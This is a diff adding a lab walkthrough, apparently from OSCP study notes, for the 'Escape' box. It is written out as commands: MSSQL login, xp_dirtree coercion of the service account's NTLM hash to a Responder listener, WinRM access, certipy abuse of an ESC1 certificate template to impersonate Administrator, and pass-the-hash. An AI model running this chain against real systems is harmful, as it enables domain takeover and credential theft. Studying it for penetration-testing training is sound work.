@@ -1099,3 +1099,49 @@ $DCip    = DC01 (LDAP, Kerberos, SMB, Global Catalog, WinRM)
 ```
 
 Always map the supplied IPs before applying `$BoxIP` to AD commands. The lab's first supplied address was not the attack-path entry host.
+
+## Escape: MSSQL coercion to AD CS ESC1 and pass-the-hash
+
+```bash
+# Validate the SQL authentication credential recovered from the anonymous PDF.
+mssqlclient.py "$Domain/$PublicUser:$PublicPassword@$BoxIP" -port "$MssqlPort"
+
+# In the MSSQL prompt, check privilege and test the direct execution path.
+SELECT SYSTEM_USER;
+SELECT IS_SRVROLEMEMBER('sysadmin');
+EXEC master..xp_cmdshell 'whoami';
+
+# Start the Kali SMB authentication listener in another terminal.
+sudo responder -I tun0 -wv
+
+# In the MSSQL prompt, trigger outbound authentication from the SQL service account.
+EXEC master..xp_dirtree '\\$LocalIP\share', 1, 1;
+
+# Validate the cracked service account and move to WinRM.
+netexec winrm "$BoxIP" -u "$SQLUser" -p "$SQLPassword" -d "$Domain"
+evil-winrm -i "$BoxIP" -u "$SQLUser" -p "$SQLPassword"
+
+# Enumerate certificate templates as the recovered domain user.
+certipy find -u "$RyanUser@$Domain" -p "$RyanPassword" \
+  -dc-ip "$BoxIP" -vulnerable -stdout \
+  > "$BoxDir/loot/certipy-vulnerable.txt"
+
+# Request a certificate only after confirming ESC1 prerequisites.
+certipy req -u "$RyanUser@$Domain" -p "$RyanPassword" \
+  -dc-ip "$BoxIP" -ca "$CAName" -template "$Template" \
+  -upn "$AdminUser@$Domain" \
+  > "$BoxDir/loot/certipy-request.txt"
+
+# Use a process-scoped clock when the DC remains offset.
+faketime -f "+8h" certipy auth \
+  -pfx "$BoxDir/loot/administrator.pfx" -dc-ip "$BoxIP" \
+  > "$BoxDir/loot/certipy-auth.txt"
+
+# Validate the returned Administrator NT hash and use it without cracking.
+netexec smb "$BoxIP" -u "$AdminUser" -H "$AdminHash" -d "$Domain"
+evil-winrm -i "$BoxIP" -u "$AdminUser" -H "$AdminHash"
+```
+
+The SQL credential, Net-NTLMv2 response, passwords, PFX, returned NT hash, and proof files are private loot. See [[OSCP/BOXES/WRITE UPS/Windows/Escape|Escape]] and [[OSCP/RUNBOOK V2/AD - Certificate Services ESC1|AD Certificate Services ESC1]].
+
+#### Tags: #Escape #MSSQL #xpDirtree #NetNTLMv2 #ADCS #ESC1 #Certipy #KerberosClockSkew #PassTheHash
